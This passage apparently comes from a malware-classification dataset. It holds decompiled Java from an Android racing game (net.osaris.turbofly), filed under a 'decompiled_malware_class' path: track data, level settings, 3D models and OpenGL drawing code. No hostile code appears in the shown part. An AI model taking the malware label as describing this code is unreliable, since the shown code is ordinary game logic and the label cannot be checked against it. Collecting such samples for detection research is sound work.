double[]{15.0d,0.0d,0.0d,0.0037d,-0.0d,-1000.0d,1000.0d},new double[]{5.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{25.0d,0.0d,0.0d,0.0051d,-0.0d,-1000.0d,1000.0d},new double[]{25.0d,0.0d,0.0d,-0.014d,0.0d,-1000.0d,1000.0d},new double[]{25.0d,0.0d,0.0d,0.0037d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,-0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,-0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.013d,0.0d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,0.0d,0.0037d,-0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,-0.0045d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.02d,-0.0d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,0.0d,0.015d,-0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.0d,-0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.003d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,-0.014d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.01d,-0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,-0.01d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,-0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,-0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.01d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{-1.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d}};   public static double[][] trackDemo01={new double[]{30.0d,0.0d,0.0d,0.01d,0.0d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,0.0d,0.05d,0.005d,-1000.0d,1000.0d},new double[]{5.0d,0.0d,0.0d,0.0d,-0.005d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,-0.1d,0.0d,-1000.0d,1000.0d},new double[]{4.0d,0.0d,1.0d,0.015d,-0.015d,-1000.0d,1000.0d},new double[]{36.0d,0.0d,1.0d,0.015d,0.0015d,-1000.0d,1000.0d},new double[]{6.0d,0.0d,1.0d,-0.1d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,1.0d,0.05d,-0.001d,-1000.0d,1000.0d},new double[]{34.0d,0.0d,0.0d,-0.025d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.05d,0.0d,-1000.0d,1000.0d},new double[]{30.0d,0.0d,1.0d,0.01d,0.002d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,1.0d,-0.05d,0.0d,-1000.0d,1000.0d},new double[]{25.0d,0.0d,2.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{25.0d,0.0d,2.0d,0.01d,0.01d,-1000.0d,1000.0d},new double[]{25.0d,0.0d,0.0d,-0.04d,-0.01d,-1000.0d,1000.0d},new double[]{25.0d,0.0d,0.0d,0.05d,0.0d,-1000.0d,1000.0d},new double[]{40.0d,0.0d,0.0d,-0.01d,-0.01d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,1.0d,0.03d,0.05d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,1.0d,0.05d,-0.03d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,1.0d,-0.065d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,1.0d,0.0d,-0.04d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,1.0d,0.02d,0.03d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,2.0d,0.02d,0.03d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,2.0d,0.04d,-0.01d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,2.0d,0.0d,0.03d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,2.0d,-0.04d,-0.02d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.03d,0.012d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.01d,0.02d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,-0.01d,-0.02d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,-0.02d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,-0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{-1.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d}}; static {     nbLvls=JumpyBall.essai ? 2 : 23;     currentLvl=0;     nbTracks=JumpyBall.essai ? 2 : 8;     nbUnlocked=22;     nbTrackUnlocked=8;     int[] iArr=new int[23];     iArr[1]=JumpyBall.essai ? 2 : 0;     iArr[2]=2;     iArr[4]=1;     iArr[6]=2;     iArr[10]=2;     iArr[11]=1;     iArr[15]=2;     iArr[18]=1;     iArr[22]=2;     lvlType=iArr;     int[] iArr2=new int[23];     iArr2[0]=JumpyBall.essai ? 1 : 0;     iArr2[1]=JumpyBall.essai ? 2 : 1;     iArr2[3]=2;     iArr2[4]=1;     iArr2[6]=2;     iArr2[7]=3;     iArr2[8]=4;     iArr2[9]=1;     iArr2[10]=3;     iArr2[11]=4;     iArr2[12]=5;     iArr2[14]=6;     iArr2[15]=4;     iArr2[16]=1;     iArr2[17]=5;     iArr2[18]=6;     iArr2[19]=7;     iArr2[20]=4;     iArr2[21]=3;     lvlTrack=iArr2;     int[] iArr3=new int[23];     iArr3[0]=JumpyBall.essai ? 2 : 3;     iArr3[1]=JumpyBall.essai ? 15000 : 3;     iArr3[2]=10000;     iArr3[3]=3;     iArr3[4]=30;     iArr3[5]=3;     iArr3[6]=14000;     iArr3[7]=2;     iArr3[8]=2;     iArr3[9]=2;     iArr3[10]=18000;     iArr3[11]=30;     iArr3[12]=2;     iArr3[13]=2;     iArr3[14]=1;     iArr3[15]=25000;     iArr3[16]=1;     iArr3[17]=1;     iArr3[18]=30;     iArr3[19]=1;     iArr3[20]=1;     iArr3[21]=1;     iArr3[22]=40000;     lvlScore=iArr3;     int[] iArr4=new int[23];     iArr4[0]=JumpyBall.essai ? 1 : 0;     iArr4[1]=JumpyBall.essai ? 1 : 0;     iArr4[2]=1;     iArr4[3]=1;     iArr4[4]=1;     iArr4[5]=2;     iArr4[6]=2;     iArr4[7]=2;     iArr4[8]=2;     iArr4[9]=2;     iArr4[10]=2;     iArr4[11]=3;     iArr4[12]=3;     iArr4[13]=3;     iArr4[14]=3;     iArr4[15]=4;     iArr4[16]=4;     iArr4[17]=4;     iArr4[18]=4;     iArr4[19]=4;     iArr4[20]=4;     iArr4[21]=4;     iArr4[22]=4;     lvlBaseship=iArr4;     lvlSpeed=new double[]{1.02d,1.02d,1.01d,1.02d,1.03d,1.0d,1.01d,1.0d,1.03d,1.03d,1.0d,1.0d,1.02d,1.02d,1.03d,1.04d,1.0d,1.01d,1.01d,1.02d,1.03d,1.03d,1.02d};     nbShipUnlocked=5;     mode=0;     currentTrack=0;     currentMode=0;     currentBaseship=0;     currentLvlSpeed=1.0d;     String[] strArr=new String[9];     strArr[0]=""Namiro"";     strArr[1]=""Subway"";     strArr[2]=""Nadher I"";     strArr[3]=""Greenwich"";     strArr[4]=JumpyBall.chinese ? ""Frozen"" : ""Frozen Highway"";     strArr[5]=""Nadher II"";     strArr[6]=""North S.T."";     strArr[7]=JumpyBall.chinese ? ""Godav"" : ""Godav City"";     strArr[8]=""JumpyBall"";     trackNames=strArr;     trackEnv=new int[]{4,6,2,0,7,2,1,3,5};     trackTexture=new String[]{""l41.png"",""l32.png"",""l21.png"",""l01.png"",""l42.png"",""l22.png"",""l11.png"",""l31.png"",""l32.png""};   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly.models\Flash.code","public class Flash extends Model3D {   public Flash(  int decX,  int decY,  int decZ,  int texture){     super(4,2,texture);     setScale(6144,(-122880) / 20,6144,1024,1024);     putPoint((-6) + decX,decY + 8,decZ - 8,0,0);     putPoint(6 + decX,decY + 8,decZ - 8,64,0);     putPoint((-6) + decX,decY - 4,decZ - 11,0,64);     putPoint(6 + decX,decY - 4,decZ - 11,64,64);     putTriangle(2,1,0);     putTriangle(2,3,1);     finishUp();   }   public Flash(  int decX,  int decY,  int decZ,  int texture,  boolean missile){     super(4,2,texture);     setScale(2457,(-122880) / 50,2457,1024,1024);     putPoint(decX - 8,decY + 10,decZ - 8,0,0);     putPoint(decX + 8,decY + 10,decZ - 8,64,0);     putPoint(decX - 8,decY - 6,decZ - 11,0,64);     putPoint(decX + 8,decY - 6,decZ - 11,64,64);     putTriangle(2,1,0);     putTriangle(2,3,1);     finishUp();   }   public Flash(  int deccX,  int deccY,  int deccZ,  int taille,  int texture){     super(8,4,texture);     int decX=deccX - 5;     int decY=deccY + 1;     int decZ=deccZ - 10;     setScale(3072,(-122880) / 40,3072,1024,1024);     putPoint((-taille) + decX,taille + 2 + decY,decZ - 8,0,0);     putPoint(taille + decX,taille + 2 + decY,decZ - 8,64,0);     putPoint((-taille) + decX,(2 - taille) + decY,decZ - 11,0,64);     putPoint(taille + decX,(2 - taille) + decY,decZ - 11,64,64);     putTriangle(2,1,0);     putTriangle(2,3,1);     setScale(3072,(-122880) / 40,(int)(122880 / 40.1d),1024,1024);     int decX2=5 - deccX;     int decY2=deccY + 1;     int decZ2=deccZ - 10;     putPoint((-taille) + decX2,taille + 2 + decY2,decZ2 - 8,0,0);     putPoint(taille + decX2,taille + 2 + decY2,decZ2 - 8,64,0);     putPoint((-taille) + decX2,(2 - taille) + decY2,decZ2 - 11,0,64);     putPoint(taille + decX2,(2 - taille) + decY2,decZ2 - 11,64,64);     putTriangle(6,5,4);     putTriangle(6,7,5);     finishUp();   }   public Flash(  int texture,  boolean theOtherOne){     super(12,6,texture);     setScale(3072,(-122880) / 40,3072,1024,1024);     putPoint(-16,2,-17,0,0);     putPoint(-3,2,-17,64,0);     putPoint(-16,-12,-17,0,64);     putPoint(-3,-12,-17,64,64);     putTriangle(2,1,0);     putTriangle(2,3,1);     setScale(6144,(-122880) / 20,6144,1024,1024);     putPoint(-7,7,-13,0,0);     putPoint(7,7,-13,64,0);     putPoint(-7,-7,-13,0,64);     putPoint(7,-7,-13,64,64);     setScale(3072,(-122880) / 40,(int)(122880 / 39.95d),1024,1024);     putPoint(3,2,-17,0,0);     putPoint(16,2,-17,64,0);     putPoint(3,-12,-17,0,64);     putPoint(16,-12,-17,64,64);     putTriangle(6,5,4);     putTriangle(6,7,5);     putTriangle(10,9,8);     putTriangle(10,11,9);     finishUp();   }   @Override public void draw(){     GLES10.glDisable(2884);     int n=InGame.player.vzb == 0.0f ? 1 : 10;     float i=0.0f;     while (i < n) {       float alpha=1.0f;       float size=((InGame.player.vzb + 6.0f) / 8.0f) / n;       float l=1.0f;       double dec=0.0d;       if (i > 0.0f) {         float alpha2=Math.min((InGame.player.vzb + 2.0f) / 5.0f,1.0f) * (1.0f - (i / n)) * 0.9f;         alpha=(float)(alpha2 + ((Math.random() * 0.1d) - 0.05d));         dec=Math.random() * size * 0.5d;         l=i == 1.0f ? 0.75f : 0.5f;         if (alpha > 0.0f) {           GLES10.glScalef(l,l,1.0f);         }       }       GLES10.glColor4f(alpha,alpha,alpha,alpha);       GLES10.glTranslatex(0,0,(int)(65536.0d * (dec - (size * i))));       if (alpha > 0.0f) {         super.draw();       }       GLES10.glTranslatex(0,0,-((int)(65536.0d * (dec - (size * i)))));       if (i > 0.0f && alpha > 0.0f) {         GLES10.glScalef(1.0f / l,1.0f / l,1.0f);       }       i+=1.0f;     }     GLES10.glEnable(2884);     GLES10.glColor4f(1.0f,1.0f,1.0f,1.0f);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly.models\Mine.code","public class Mine { } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly.models\Model3D.code","public class Model3D {   private int NB_BYTE_PER_POINTS;   private boolean clockWise;   private int dtx;   private int dty;   private int dx;   private int dy;   private int dz;   public GL11 gl11;   private boolean hasNormals;   protected int index_object;   public ShortBuffer mIndexBuffer;   public IntBuffer mNormalsBuffer;   public IntBuffer mTexBuffer;   public IntBuffer mVBOVertexTexBuffer;   public IntBuffer mVertexBuffer;   private int nbPoints;   private int nbTriangles;   public int nbTrianglesToDraw;   private int nx;   private int ny;   private int nz;   private boolean symX;   protected int tex_object;   public int texture;   protected int vertex_object;   public void setNbTrianglesToDraw(  int nb){     this.nbTrianglesToDraw=nb;   }   protected Model3D(){     this.texture=0;     this.hasNormals=false;     this.NB_BYTE_PER_POINTS=5;     this.clockWise=false;     this.gl11=null;     this.symX=false;     this.dx=1;     this.dy=1;     this.dz=1;     this.nx=65536;     this.ny=65536;     this.nz=65536;     this.dtx=1;     this.dty=1;   }   public Model3D(  String file,  int dx,  int dy,  int dz,  int texture){     this();     InputStream is=OsarisTools.openAsset(""objs/"" + file);     this.texture=texture;     this.hasNormals=true;     this.NB_BYTE_PER_POINTS=8;     ObjReader obj=new ObjReader(is,false);     obj.readFile();     this.nbPoints=obj.vertices.size();     this.nbTriangles=obj.polygons.size() / 3;     this.nbTrianglesToDraw=this.nbTriangles;     createBuffers();     this.dtx=65536;     this.dty=65536;     this.dx=dx;     this.dy=dy;     this.dz=dz;     this.nx=(int)(Math.signum(dx) * 65536.0f);     this.ny=(int)(Math.signum(dy) * 65536.0f);     this.nz=(int)(Math.signum(dz) * 65536.0f);     Iterator it=obj.vertices.iterator();     while (it.hasNext()) {       putPoint((Point3)it.next());     }     Iterator it2=obj.textures.iterator();     while (it2.hasNext()) {       Object point_=it2.next();       Point3 point=(Point3)point_;       this.mTexBuffer.put((int)(point.x * this.dtx));       this.mTexBuffer.put(65536 - ((int)(point.y * this.dty)));     }     Iterator it3=obj.polygons.iterator();     while (it3.hasNext()) {       Object vertex=it3.next();       this.mIndexBuffer.put((short)(((Integer)vertex).shortValue() - 1));     }     Iterator it4=obj.normals.iterator();     while (it4.hasNext()) {       Object point_2=it4.next();       Point3 point2=(Point3)point_2;       this.mNormalsBuffer.put((int)((-point2.x) * this.nx));       this.mNormalsBuffer.put((int)((-point2.y) * this.ny));       this.mNormalsBuffer.put((int)((-point2.z) * this.nz));     }     finishUp();   }   public void recreate(  int texture){     this.texture=texture;     recreateBuffers();     if (doYaWannaUzDaVBOz()) {       bindBuffers();     }   }   public Model3D(  int _nbp,  int _nbt,  int texture){     this();     this.texture=texture;     this.nbPoints=_nbp;     this.nbTriangles=_nbt;     this.nbTrianglesToDraw=this.nbTriangles;     createBuffers();   }   public void createBuffers(){     ByteBuffer vbb=ByteBuffer.allocateDirect(this.nbPoints * 3 * 4);     vbb.order(ByteOrder.nativeOrder());     this.mVertexBuffer=vbb.asIntBuffer();     if (this.hasNormals) {       ByteBuffer vbn=ByteBuffer.allocateDirect(this.nbPoints * 3 * 4);       vbn.order(ByteOrder.nativeOrder());       this.mNormalsBuffer=vbn.asIntBuffer();     }     if (this.nbTriangles > 0) {       ByteBuffer cbsb=ByteBuffer.allocateDirect(this.nbTriangles * 3 * 2);       cbsb.order(ByteOrder.nativeOrder());       this.mIndexBuffer=cbsb.asShortBuffer();     }     ByteBuffer tbb=ByteBuffer.allocateDirect(this.nbPoints * 2 * 4);     tbb.order(ByteOrder.nativeOrder());     this.mTexBuffer=tbb.asIntBuffer();     if (doYaWannaUzDaVBOz()) {       int[] buffers=new int[3];       GLES11.glGenBuffers(3,buffers,0);       this.vertex_object=buffers[0];       this.index_object=buffers[1];       this.tex_object=buffers[2];       ByteBuffer vbo=ByteBuffer.allocateDirect(this.nbPoints * this.NB_BYTE_PER_POINTS * 4);       vbo.order(ByteOrder.nativeOrder());       this.mVBOVertexTexBuffer=vbo.asIntBuffer();     }   }   public void recreateBuffers(){     if (doYaWannaUzDaVBOz()) {       int[] buffers=new int[3];       GLES11.glGenBuffers(3,buffers,0);       this.vertex_object=buffers[0];       this.index_object=buffers[1];       this.tex_object=buffers[2];     }   }   public void symetrizeX(){     this.symX=true;   }   public void putPoint(  int x,  int y,  int z,  int tex,  int tey,  int ncx,  int ncy,  int ncz){     this.mVertexBuffer.put(this.dx * x);     this.mVertexBuffer.put(this.dy * y);     this.mVertexBuffer.put(this.dz * z);     this.mTexBuffer.put(this.dtx * tex);     this.mTexBuffer.put(this.dty * tey);     if (this.hasNormals) {       this.mNormalsBuffer.put((-ncx) * this.nx);       this.mNormalsBuffer.put((-ncy) * this.ny);       this.mNormalsBuffer.put((-ncz) * this.nz);     }     if (this.symX) {       this.mVertexBuffer.put((-x) * this.dx);       this.mVertexBuffer.put(this.dy * y);       this.mVertexBuffer.put(this.dz * z);       this.mTexBuffer.put(this.dtx * tex);       this.mTexBuffer.put(this.dty * tey);       if (this.hasNormals) {         this.mNormalsBuffer.put((-ncx) * this.nx);         this.mNormalsBuffer.put(this.ny * ncy);         this.mNormalsBuffer.put(this.nz * ncz);       }     }   }   public void putPoint(  int x,  int y,  int z,  int tex,  int tey){     putPoint(x,y,z,tex,tey,0,-1,0);   }   protected void putPoint(  Point3 p){     this.mVertexBuffer.put((int)(p.x * this.dx));     this.mVertexBuffer.put((int)(p.y * this.dy));     this.mVertexBuffer.put((int)(p.z * this.dz));   }   protected void putPointNoScale(  Point3 p){     this.mVertexBuffer.put((int)p.x);     this.mVertexBuffer.put((int)p.y);     this.mVertexBuffer.put((int)p.z);   }   public void putTriangle(  short p1,  short p2,  short p3){     if (this.symX) {       this.mIndexBuffer.put((short)(p1 * 2));       this.mIndexBuffer.put((short)(p2 * 2));       this.mIndexBuffer.put((short)(p3 * 2));       this.mIndexBuffer.put((short)((p3 * 2) + 1));       this.mIndexBuffer.put((short)((p2 * 2) + 1));       this.mIndexBuffer.put((short)((p1 * 2) + 1));       return;     }     this.mIndexBuffer.put(p1);     this.mIndexBuffer.put(p2);     this.mIndexBuffer.put(p3);   }   public void putTriangle(  int p1,  int p2,  int p3){     putTriangle((short)p1,(short)p2,(short)p3);   }   public void finishUp(){     this.mVertexBuffer.position(0);     this.mIndexBuffer.position(0);     this.mTexBuffer.position(0);     if (this.hasNormals) {       this.mNormalsBuffer.position(0);     }     if (doYaWannaUzDaVBOz()) {       this.mVBOVertexTexBuffer.position(0);       for (int i=0; i < this.nbPoints; i++) {         this.mVBOVertexTexBuffer.put(this.mVertexBuffer.get());         this.mVBOVertexTexBuffer.put(this.mVertexBuffer.get());         this.mVBOVertexTexBuffer.put(this.mVertexBuffer.get());         this.mVBOVertexTexBuffer.put(this.mTexBuffer.get());         this.mVBOVertexTexBuffer.put(this.mTexBuffer.get());         if (this.hasNormals) {           this.mVBOVertexTexBuffer.put(this.mNormalsBuffer.get());           this.mVBOVertexTexBuffer.put(this.mNormalsBuffer.get());           this.mVBOVertexTexBuffer.put(this.mNormalsBuffer.get());         }       }       if (this.hasNormals) {         this.mNormalsBuffer.position(0);       }       this.mVertexBuffer.position(0);       this.mTexBuffer.position(0);       this.mVBOVertexTexBuffer.position(0);       bindBuffers();     }   }   private void bindBuffers(){     GLES11.glBindBuffer(34962,this.vertex_object);     GLES11.glBufferData(34962,this.nbPoints * this.NB_BYTE_PER_POINTS * 4,this.mVBOVertexTexBuffer,35044);     GLES11.glBindBuffer(34962,0);     GLES11.glBindBuffer(34963,this.index_object);     GLES11.glBufferData(34963,this.nbTriangles * 3 * 2,this.mIndexBuffer,35044);     GLES11.glBindBuffer(34963,0);   }   public void clockWise(){     this.clockWise=!this.clockWise;   }   public void draw(){     if (this.clockWise) {       GLES10.glFrontFace(2304);     }  else {       GLES10.glFrontFace(2305);     }     GLES10.glBindTexture(3553,this.texture);     if (doYaWannaUzDaVBOz()) {       GLES11.glBindBuffer(34962,this.vertex_object);       if (this.hasNormals) {         GLES11.glVertexPointer(3,5132,32,0);         GLES11.glTexCoordPointer(2,5132,32,12);         GLES10.glEnableClientState(32885);         GLES11.glNormalPointer(5132,32,20);       }  else {         GLES11.glVertexPointer(3,5132,20,0);         GLES11.glTexCoordPointer(2,5132,20,12);       }       GLES11.glBindBuffer(34963,this.index_object);       GLES11.glDrawElements(4,this.nbTrianglesToDraw * 3,5123,0);       GLES11.glBindBuffer(34962,0);       GLES11.glBindBuffer(34963,0);       if (this.hasNormals) {         GLES10.glDisableClientState(32885);         return;       }       return;     }     GLES10.glVertexPointer(3,5132,0,this.mVertexBuffer);     GLES10.glEnable(3553);     GLES10.glTexCoordPointer(2,5132,0,this.mTexBuffer);     GLES10.glDrawElements(4,this.nbTrianglesToDraw * 3,5123,this.mIndexBuffer);   }   public void setScale(  int dx,  int dy,  int dz,  int tx,  int ty){     this.dx=dx;     this.dy=dy;     this.dz=dz;     this.dtx=tx;     this.dty=ty;   }   public void setTexture(  int texture){     this.texture=texture;   }   public int getTexture(){     return this.texture;   }   public boolean doYaWannaUzDaVBOz(){     return false;   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly.models\Ombre.code","public class Ombre {   private ShortBuffer mIndexBuffer;   private IntBuffer mTexBuffer;   private IntBuffer mVertexBuffer;   private int nbp=4;   public Ombre(  int one,  int one2){     int[] vertices=new int[this.nbp * 3 * 4];     vertices[0]=(-one) / 2;     vertices[1]=-1024;     vertices[2]=(-one2) / 2;     int k=0 + 3;     vertices[k]=one / 2;     vertices[4]=-1024;     vertices[5]=(-one2) / 2;     int k2=k + 3;     vertices[k2]=(-one) / 2;     vertices[7]=-1024;     vertices[8]=one2;     int k3=k2 + 3;     vertices[k3]=one / 2;     vertices[10]=-1024;     vertices[11]=one2;     int i=k3 + 3;     short[] indices=new short[this.nbp];     indices[0]=(short)0;     int k4=0 + 1;     indices[k4]=(short)1;     int k5=k4 + 1;     indices[k5]=(short)2;     int k6=k5 + 1;     indices[k6]=(short)3;     int i2=k6 + 1;     ByteBuffer vbb=ByteBuffer.allocateDirect(vertices.length * 4);     vbb.order(ByteOrder.nativeOrder());     this.mVertexBuffer=vbb.asIntBuffer();     this.mVertexBuffer.put(vertices);     this.mVertexBuffer.position(0);     ByteBuffer cbsb=ByteBuffer.allocateDirect(indices.length * 2);     cbsb.order(ByteOrder.nativeOrder());     this.mIndexBuffer=cbsb.asShortBuffer();     this.mIndexBuffer.put(indices);     this.mIndexBuffer.position(0);     ByteBuffer tbb=ByteBuffer.allocateDirect(this.nbp * 2 * 4);     tbb.order(ByteOrder.nativeOrder());     this.mTexBuffer=tbb.asIntBuffer();     this.mTexBuffer.put(0);     this.mTexBuffer.put(0);     this.mTexBuffer.put(0);     this.mTexBuffer.put(65536);     this.mTexBuffer.put(65536);     this.mTexBuffer.put(0);     this.mTexBuffer.put(65536);     this.mTexBuffer.put(65536);     this.mTexBuffer.position(0);   }   public void draw(){     GLES10.glFrontFace(2305);     GLES10.glVertexPointer(3,5132,0,this.mVertexBuffer);     GLES10.glEnable(3553);     GLES10.glTexCoordPointer(2,5132,0,this.mTexBuffer);     GLES10.glDrawArrays(5,0,4);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly.models\Piste.code","public class Piste {   public static Truc arrivee;   private static double courbePente;   private static Vector3 currentDirection;   private static Segment currentSegment;   private static Sequence currentSequence;   private static SectionType currentType;   private static boolean descend;   public static boolean hasSkybox;   public static int level;   public static double[][] lines;   private static int longueurMonte;   public static Truc miss;   private static boolean monte;   private static boolean pente;   public static Segment[] precalculated;   public static Segment segmentStandard;   public static Model3D skybox;   private static double targetY=0.0d;   private static double initialY=0.0d;   private static double middleY=0.0d;   private static double monteGlobale=0.0d;   public static int nbSegments=50;   private static int pos=0;   private static int repeat=0;   private static int nbRepeatToDo=0;   public static Truc[] boost=new Truc[3];   public static boolean stop=false;   private static int playerZ=1;   public static int tailleCircuit=550;   private static boolean precalc=true;   public static int currentSize=0;   public static int currentLine=0;   public static double currentDecY=0.0d;   public static double currentMin=0.0d;   public static double currentMax=0.0d;   public static void staticInit(){     System.out.println(""initializing segments"");     precalculated=new Segment[610];     Segment.staticInit();     for (int i=0; i < precalculated.length; i++) {       precalculated[i]=new Segment();     }     loadTrucs(level);   }   public static void init(  int level2){     if (Tracks.currentTrack == 0) {       lines=Tracks.track41;     }  else     if (Tracks.currentTrack == 1) {       lines=Tracks.track32;     }  else     if (Tracks.currentTrack == 2) {       lines=Tracks.track21;     }  else     if (Tracks.currentTrack == 3) {       lines=Tracks.track01;     }  else     if (Tracks.currentTrack == 4) {       lines=Tracks.track42;     }  else     if (Tracks.currentTrack == 5) {       lines=Tracks.track22;     }  else     if (Tracks.currentTrack == 6) {       lines=Tracks.track11;     }  else     if (Tracks.currentTrack == 7) {       lines=Tracks.track31;     }  else     if (Tracks.currentTrack == 8) {       lines=Tracks.trackTest;     }     currentSize=0;     currentLine=0;     level=level2;     boost[0].z=-1;     boost[1].z=-1;     boost[2].z=-1;     miss.z=-1;     arrivee.z=-1;     hasSkybox=false;     if (level2 == 0) {       hasSkybox=true;       createSkyBox(TextureUtil.loadTexture(""skybox9.png""));     }     if (level2 == 1) {       hasSkybox=true;       createSkyBox(TextureUtil.loadTexture(""skybox.png""));     }     if (level2 == 2) {       hasSkybox=true;       createSkyBox(TextureUtil.loadTexture(""skybox3.png""));     }     if (level2 == 3) {       hasSkybox=true;       createSkyBox(TextureUtil.loadTexture(""skybox4.png""));     }     if (level2 == 4) {       hasSkybox=true;       createSkyBox(TextureUtil.loadTexture(""skybox10.png""));     }     if (level2 == 5) {       hasSkybox=true;       createSkyBox(TextureUtil.loadTexture(""skybox7.jpg""));     }     if (level2 == 6) {       hasSkybox=true;       createSkyBox(TextureUtil.loadTexture(""skybox8.png""));     }     if (level2 == 7) {       hasSkybox=true;       createSkyBox(TextureUtil.loadTexture(""skybox12.png""));     }     pente=false;     monte=false;     descend=false;     longueurMonte=0;     courbePente=0.0d;     currentSegment=null;     monteGlobale=0.0d;     DecorsFactory.loadLevel(level2);     pos=0;     repeat=0;     currentDirection=new Vector3(0.0d,0.0d,1.0d);     currentSequence=Sequence.sequences[0];     segmentStandard=new Segment();     createNextSegment(segmentStandard,null,-1);     if (precalc) {       System.out.println(""creating segments"");       for (int i=0; i < precalculated.length; i++) {         precalculated[i].trucsDessus.clear();       }       createNextSegment(precalculated[0],null,0);       for (int i2=1; i2 < precalculated.length; i2++) {         createNextSegment(precalculated[i2],precalculated[i2 - 1],i2);       }       System.out.println(""copying segments"");       if (InGame.mode == 0) {         arrivee.setZ(tailleCircuit - 16);         arrivee.setZ(tailleCircuit - 12);         arrivee.setZ(tailleCircuit - 8);         arrivee.setZ(tailleCircuit - 4);       }       arrivee.segment=null;     }     System.gc();     playerZ=1;   }   public static void loadTrucs(  int level2){     for (int i=0; i < boost.length; i++) {       boost[i]=new Truc();       boost[i].model3d=new Rect3D(64,32,TextureUtil.loadTexture(""boost.png""));       boost[i].isStatic=true;       boost[i].isTransparent=true;       boost[i].sizeX=1.0f;       boost[i].sizeY=0.5f;       boost[i].sizeZ=0.5f;       boost[i].majRelXYZ(0.0d,-0.04d,0.0d);     }     arrivee=new Truc();     arrivee.model3d=new Rect3D(192,32,TextureUtil.loadTexture(""arrivee.png""));     arrivee.isStatic=true;     arrivee.isTransparent=true;     arrivee.majRelXYZ(0.0d,-0.04d,0.0d);     arrivee.shape=3;     miss=new Truc();     miss.model3d=new Rect3D(64,32,TextureUtil.loadTexture(""miss.png""));     miss.isStatic=true;     miss.isTransparent=true;     miss.sizeX=1.0f;     miss.sizeY=0.5f;     miss.sizeZ=0.5f;     miss.majRelXYZ(0.0d,-0.04d,0.0d);   }   public static void createNextSegment(  Segment segment,  Segment previous,  int z){     double decY=0.0d;     if (z > tailleCircuit) {       Segment modele=getSegments(z - tailleCircuit);       currentDirection.set(modele.directionRaw);       currentType=modele.type;       currentSequence=modele.sequence;       decY=modele.decY;     }  else {       directionMAJ();       sectionTypeMAJ();       if (currentDecY != 0.0d) {         decY=currentDecY;         currentDecY=0.0d;       }     }     if (Tracks.currentTrack == 3) {       segment.sizeN1=-3.6d;       segment.sizeP1=3.6d;       segment.sizeN2=-3.6d;       segment.sizeP2=3.6d;     }  else {       segment.sizeN1=-3.0d;       segment.sizeP1=3.0d;       segment.sizeN2=-3.0d;       segment.sizeP2=3.0d;     }     segment.create(currentType,previous,currentDirection,decY,z,0.0d,0.0d,0.0d,0.0d,0.0d,0.0d,currentMin * 122880.0d,currentMax * 122880.0d,currentSequence);     if (z < tailleCircuit) {       if (!InGame.multi && Math.random() > 0.95d && boost[1].z + 70 < z && z > 15) {         boost[0].setZ(z);         boost[1].setZ(z - 2);         boost[2].setZ(z - 4);       